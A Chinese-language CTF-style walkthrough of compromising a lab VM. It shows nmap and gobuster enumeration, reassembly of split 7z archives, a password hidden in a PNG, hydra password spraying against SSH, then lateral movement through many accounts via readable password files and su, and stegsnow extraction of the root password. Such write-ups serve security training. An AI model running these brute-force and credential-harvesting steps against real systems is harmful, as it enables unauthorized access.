# 信息搜集

主机发现

```aiignore
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24                                   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-13 04:06 EDT
Nmap scan report for 192.168.21.1
Host is up (0.0020s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.2
Host is up (0.000091s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.9
Host is up (0.00017s latency).
MAC Address: 08:00:27:FE:D5:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.7
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.05 seconds
```

端口扫描

```aiignore
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.21.9                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-13 04:07 EDT
Nmap scan report for 192.168.21.9
Host is up (0.00067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT  STATE SERVICE VERSION
1/tcp open  ssh     OpenSSH 9.3 (protocol 2.0)
2/tcp open  http    Apache httpd 2.4.58 ((Unix))
MAC Address: 08:00:27:FE:D5:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds
```

# 漏洞利用

看一下http服务

![img.png](img.png)

目录枚举

```aiignore
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://192.168.21.9:2
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.9:2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 199]
.htaccess            (Status: 403) [Size: 199]
.htpasswd            (Status: 403) [Size: 199]
index.html           (Status: 200) [Size: 7511]
robots.txt           (Status: 200) [Size: 21]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

看一下/robots.txt

```aiignore
User-agent: *
#7z.001
```

提示7z.001，但是怎么扫也没有结果，换个大点的字典，重新扫一下

```aiignore
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -u http://192.168.21.9:2
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.9:2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
getslack             (Status: 301) [Size: 239] [--> http://192.168.21.9:2/getslack/]                                                                      
Progress: 1185252 / 1185252 (100.00%)
===============================================================
Finished
===============================================================
```

又扫出来一个getslack，看一下

```aiignore
search here 
```

让扫这个目录

```aiignore
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -u http://192.168.21.9:2/getslack -x 7z.001
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.9:2/getslack
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              7z.001
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
twitter.7z.001       (Status: 200) [Size: 20480]
logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.7z.001 (Status: 403) [Size: 199]
Progress: 2370504 / 2370504 (100.00%)
===============================================================
Finished
===============================================================
```

扫到了，下载下来看一下

```aiignore
┌──(kali㉿kali)-[~]
└─$ file twitter.7z.001 
twitter.7z.001: 7-zip archive data, version 0.4
```

看一下还有没其他的分卷

```aiignore
┌──(kali㉿kali)-[~]
└─$ for i in $(seq -f "%03g" 1 20); do
wget http://192.168.21.9:2/getslack/twitter.7z.$i
done
--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.001
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.001.1’

twitter.7z.001.1    100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.14 GB/s) - ‘twitter.7z.001.1’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.002
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.002’

twitter.7z.002      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.50 GB/s) - ‘twitter.7z.002’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.003
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.003’

twitter.7z.003      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.52 GB/s) - ‘twitter.7z.003’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.004
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.004’

twitter.7z.004      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.49 GB/s) - ‘twitter.7z.004’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.005
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.005’

twitter.7z.005      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.01 GB/s) - ‘twitter.7z.005’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.006
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.006’

twitter.7z.006      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.37 GB/s) - ‘twitter.7z.006’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.007
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.007’

twitter.7z.007      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.52 GB/s) - ‘twitter.7z.007’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.008
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.008’

twitter.7z.008      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.10 GB/s) - ‘twitter.7z.008’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.009
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.009’

twitter.7z.009      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (752 MB/s) - ‘twitter.7z.009’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.010
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.010’

twitter.7z.010      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.29 GB/s) - ‘twitter.7z.010’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.011
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.011’

twitter.7z.011      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.44 GB/s) - ‘twitter.7z.011’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.012
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.012’

twitter.7z.012      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.45 GB/s) - ‘twitter.7z.012’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.013
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.013’

twitter.7z.013      100%[================>]  20.00K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (1.45 GB/s) - ‘twitter.7z.013’ saved [20480/20480]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.014
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1860 (1.8K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.014’

twitter.7z.014      100%[================>]   1.82K  --.-KB/s    in 0s      

2026-05-13 04:29:29 (356 MB/s) - ‘twitter.7z.014’ saved [1860/1860]

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.015
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 404 Not Found
2026-05-13 04:29:29 ERROR 404: Not Found.

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.016
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 404 Not Found
2026-05-13 04:29:29 ERROR 404: Not Found.

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.017
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 404 Not Found
2026-05-13 04:29:29 ERROR 404: Not Found.

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.018
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 404 Not Found
2026-05-13 04:29:29 ERROR 404: Not Found.

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.019
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 404 Not Found
2026-05-13 04:29:29 ERROR 404: Not Found.

--2026-05-13 04:29:29--  http://192.168.21.9:2/getslack/twitter.7z.020
Connecting to 192.168.21.9:2... connected.
HTTP request sent, awaiting response... 404 Not Found
2026-05-13 04:29:29 ERROR 404: Not Found.
```

解压一下

```aiignore
┌──(kali㉿kali)-[~]
└─$ 7z x twitter.7z.001

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 20480 bytes (20 KiB)

Extracting archive: twitter.7z.001
--         
Path = twitter.7z.001
Type = Split
Physical Size = 20480
Volumes = 14
Total Physical Size = 268100
----
Path = twitter.7z
Size = 268100
--
Path = twitter.7z
Type = 7z
Physical Size = 268100
Headers Size = 130
Method = LZMA2:384k
Solid = -
Blocks = 1

Everything is Ok

Size:       267951
Compressed: 268100
```

拿到了一个一个png图片

```aiignore
┌──(kali㉿kali)-[~]
└─$ file twitter.png
twitter.png: PNG image data, 400 x 400, 8-bit/color RGB, non-interlaced
┌──(kali㉿kali)-[~]
└─$ exiftool twitter.png 
ExifTool Version Number         : 13.10
File Name                       : twitter.png
Directory                       : .
File Size                       : 268 kB
File Modification Date/Time     : 2024:03:10 16:42:47-04:00
File Access Date/Time           : 2026:05:13 04:31:27-04:00
File Inode Change Date/Time     : 2026:05:13 04:31:00-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 400
Image Height                    : 400
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Profile Name                    : icc
Profile CMM Type                : Little CMS
Profile Version                 : 4.4.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2022:12:19 06:28:40
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : GIMP built-in sRGB
Profile Copyright               : Public Domain
Media White Point               : 0.9642 1 0.82491
Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
Red Matrix Column               : 0.43604 0.22249 0.01392
Blue Matrix Column              : 0.14305 0.06061 0.71393
Green Matrix Column             : 0.38512 0.7169 0.09706
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33002
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.15001 0.06
Device Mfg Desc                 : GIMP
Device Model Desc               : sRGB
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 400x400
Megapixels                      : 0.160
┌──(kali㉿kali)-[~]
└─$ strings twitter.png
trYth1sPasS1993
```

得到的这串，有可能就是密码了，我们寻找一下用户名。

```aiignore
┌──(kali㉿kali)-[~]
└─$ cewl http://192.168.21.9:2 --lowercase > user
                                                                             
┌──(kali㉿kali)-[~]
└─$ hydra -L user -p trYth1sPasS1993 ssh://192.168.21.9:1 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-13 06:18:35
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 246 login tries (l:246/p:1), ~62 tries per task
[DATA] attacking ssh://192.168.21.9:1/
[1][ssh] host: 192.168.21.9   login: patrick   password: trYth1sPasS1993
```

ssh登录

```aiignore
┌──(kali㉿kali)-[~]
└─$ ssh patrick@192.168.21.9 -p 1         
The authenticity of host '[192.168.21.9]:1 ([192.168.21.9]:1)' can't be established.
ED25519 key fingerprint is SHA256:m/iaIzavXraumIPoCQReEwCgahrbGQe8WpPXO8nfAqE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.21.9]:1' (ED25519) to the list of known hosts.
(patrick@192.168.21.9) Password: 
Linux 5.15.145.
patrick@slackware:~$ id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),1001(kretinga)
```

# 权限提升

```aiignore
patrick@slackware:~$ ls -la
total 5
drwx--x--x  3 patrick users    104 May 13 10:19 ./
drwxr-xr-x 54 root    root    1400 Mar 10  2024 ../
drwx------  2 patrick patrick   48 May 13 10:22 .cache/
-rw-r--r--  1 patrick users   3729 Feb  2  2022 .screenrc
//太干净了，应该要移动到其他用户下，看看有哪些用户
patrick@slackware:~$ ls /home
0xeex75/    boyras200/   gatogamer/  mindsflee/   rijaba1/     whitecr0wz/
0xh3rshel/  c4rta/       h1dr0/      mrmidnight/  rpj7/        wwfymn/
0xjin/      catch_me75/  icex64/     nls/         ruycr4ft/    x4v1l0k/
aceomn/     ch4rm/       infayerts/  nolose/      sancelisso/  zacarx007/
alienum/    claor/       josemlwdf/  noname/      skinny/      zayotic/
annlynn/    cromiphi/    kaian/      patrick/     sml/         zenmpi/
avijneyam/  d3b0o/       kerszi/     powerful/    tasiyanci/   ziyos/
b4el7d/     emvee/       kretinga/   proxy/       terminal/
bit/        ftp/         lanz/       pylon/       waidroc/
//看到这么多用户，感觉就是这里了
patrick@slackware:~$ tree /home
/home
├── 0xeex75 [error opening dir]
├── 0xh3rshel [error opening dir]
├── 0xjin [error opening dir]
├── aceomn [error opening dir]
├── alienum [error opening dir]
├── annlynn [error opening dir]
├── avijneyam [error opening dir]
├── b4el7d [error opening dir]
├── bit [error opening dir]
├── boyras200 [error opening dir]
├── c4rta [error opening dir]
├── catch_me75 [error opening dir]
├── ch4rm [error opening dir]
├── claor
│   └── mypass.txt
├── cromiphi [error opening dir]
├── d3b0o [error opening dir]
├── emvee [error opening dir]
├── ftp [error opening dir]
├── gatogamer [error opening dir]
├── h1dr0 [error opening dir]
├── icex64 [error opening dir]
├── infayerts [error opening dir]
├── josemlwdf [error opening dir]
├── kaian [error opening dir]
├── kerszi [error opening dir]
├── kretinga
│   └── mypass.txt
├── lanz [error opening dir]
├── mindsflee [error opening dir]
├── mrmidnight [error opening dir]
├── nls [error opening dir]
├── nolose [error opening dir]
├── noname [error opening dir]
├── patrick
├── powerful [error opening dir]
├── proxy [error opening dir]
├── pylon [error opening dir]
├── rijaba1 [error opening dir]
├── rpj7 [error opening dir]
├── ruycr4ft [error opening dir]
├── sancelisso [error opening dir]
├── skinny [error opening dir]
├── sml [error opening dir]
├── tasiyanci [error opening dir]
├── terminal [error opening dir]
├── waidroc [error opening dir]
├── whitecr0wz [error opening dir]
├── wwfymn [error opening dir]
├── x4v1l0k [error opening dir]
├── zacarx007 [error opening dir]
├── zayotic [error opening dir]
├── zenmpi [error opening dir]
└── ziyos [error opening dir]

52 directories, 2 files
//发现了两个password
patrick@slackware:~$ cat /home/claor/mypass.txt
JRksNe5rWgis
patrick@slackware:~$ cat /home/kretinga/mypass.txt
lpV8UG0GxKuw
//claor下也没有东西
patrick@slackware:~$ su claor
Password: 
claor@slackware:/home/patrick$ cd ~
claor@slackware:~$ ls -la
total 9
drwxr-x---  2 claor kretinga  112 Mar 10  2024 .
drwxr-xr-x 54 root  root     1400 Mar 10  2024 ..
-rw-r--r--  1 claor claor    3729 Feb  2  2022 .screenrc
-rw-r-----  1 claor kretinga   13 Mar 10  2024 mypass.txt
claor@slackware:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

Password: 
Sorry, user claor may not run sudo on slackware.
//又找到一个
claor@slackware:~$ tree /home
/home
├── 0xeex75 [error opening dir]
├── 0xh3rshel [error opening dir]
├── 0xjin [error opening dir]
├── aceomn [error opening dir]
├── alienum
│   └── mypass.txt
├── annlynn [error opening dir]
├── avijneyam [error opening dir]
├── b4el7d [error opening dir]
├── bit [error opening dir]
├── boyras200 [error opening dir]
├── c4rta [error opening dir]
├── catch_me75 [error opening dir]
├── ch4rm [error opening dir]
├── claor
│   └── mypass.txt
├── cromiphi [error opening dir]
├── d3b0o [error opening dir]
├── emvee [error opening dir]
├── ftp [error opening dir]
├── gatogamer [error opening dir]
├── h1dr0 [error opening dir]
├── icex64 [error opening dir]
├── infayerts [error opening dir]
├── josemlwdf [error opening dir]
├── kaian [error opening dir]
├── kerszi [error opening dir]
├── kretinga [error opening dir]
├── lanz [error opening dir]
├── mindsflee [error opening dir]
├── mrmidnight
│   └── mypass.txt
├── nls [error opening dir]
├── nolose [error opening dir]
├── noname [error opening dir]
├── patrick [error opening dir]
├── powerful [error opening dir]
├── proxy [error opening dir]
├── pylon [error opening dir]
├── rijaba1 [error opening dir]
├── rpj7 [error opening dir]
├── ruycr4ft [error opening dir]
├── sancelisso [error opening dir]
├── skinny [error opening dir]
├── sml [error opening dir]
├── tasiyanci [error opening dir]
├── terminal [error opening dir]
├── waidroc [error opening dir]
├── whitecr0wz [error opening dir]
├── wwfymn [error opening dir]
├── x4v1l0k [error opening dir]
├── zacarx007 [error opening dir]
├── zayotic [error opening dir]
├── zenmpi [error opening dir]
└── ziyos [error opening dir]

52 directories, 3 files
claor@slackware:~$ cat /home/alienum/mypass.txt 
ex0XVRAAjCWX
claor@slackware:~$ su alienum
Password: 
alienum@slackware:~$ tree /home
/home
├── 0xeex75 [error opening dir]
├── 0xh3rshel [error opening dir]
├── 0xjin [error opening dir]
├── aceomn [error opening dir]
├── alienum
│   └── mypass.txt
├── annlynn
│   └── mypass.txt
├── avijneyam [error opening dir]
├── b4el7d [error opening dir]
├── bit [error opening dir]
├── boyras200 [error opening dir]
├── c4rta [error opening dir]
├── catch_me75 [error opening dir]
├── ch4rm [error opening dir]
├── claor [error opening dir]
├── cromiphi [error opening dir]
├── d3b0o [error opening dir]
├── emvee [error opening dir]
├── ftp [error opening dir]
├── gatogamer [error opening dir]
├── h1dr0 [error opening dir]
├── icex64 [error opening dir]
├── infayerts [error opening dir]
├── josemlwdf [error opening dir]
├── kaian [error opening dir]
├── kerszi [error opening dir]
├── kretinga [error opening dir]
├── lanz [error opening dir]
├── mindsflee [error opening dir]
├── mrmidnight
│   └── mypass.txt
├── nls [error opening dir]
├── nolose [error opening dir]
├── noname [error opening dir]
├── patrick [error opening dir]
├── powerful [error opening dir]
├── proxy [error opening dir]
├── pylon [error opening dir]
├── rijaba1 [error opening dir]
├── rpj7 [error opening dir]
├── ruycr4ft [error opening dir]
├── sancelisso [error opening dir]
├── skinny [error opening dir]
├── sml [error opening dir]
├── tasiyanci [error opening dir]
├── terminal [error opening dir]
├── waidroc [error opening dir]
├── whitecr0wz [error opening dir]
├── wwfymn [error opening dir]
├── x4v1l0k [error opening dir]
├── zacarx007 [error opening dir]
├── zayotic [error opening dir]
├── zenmpi [error opening dir]
└── ziyos [error opening dir]

52 directories, 3 files
alienum@slackware:~$ cat /home/annlynn/mypass.txt 
S64IamSERUI3
alienum@slackware:~$ su annlynn
Password: 
annlynn@slackware:/home/alienum$
//要疯啦！
rpj7@slackware:~$ ls -la
total 13
drwxr-x---  2 rpj7 b4el7d  136 Mar 11  2024 .
drwxr-xr-x 54 root root   1400 Mar 10  2024 ..
-rw-r--r--  1 rpj7 rpj7   3729 Feb  2  2022 .screenrc
-rw-r-----  1 rpj7 b4el7d   13 Mar 10  2024 mypass.txt
-rw-r--r--  1 rpj7 b4el7d  314 Mar 11  2024 user.txt
//看了大佬写的，user.txt藏东西了
┌──(kali㉿kali)-[~]
└─$ stegsnow -C user.txt
To_Jest_Bardzo_Trudne_Haslo
rpj7@slackware:~$ su
Password: 
root@slackware:/home/rpj7# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),17(audio)
root@slackware:~# cat roo00oot.txt 
There is no root flag here, but it is somewhere in the /home directory
root@slackware:~# grep -r flag /home
/home/0xh3rshel/.screenrc:# Here is a flag for root: 
```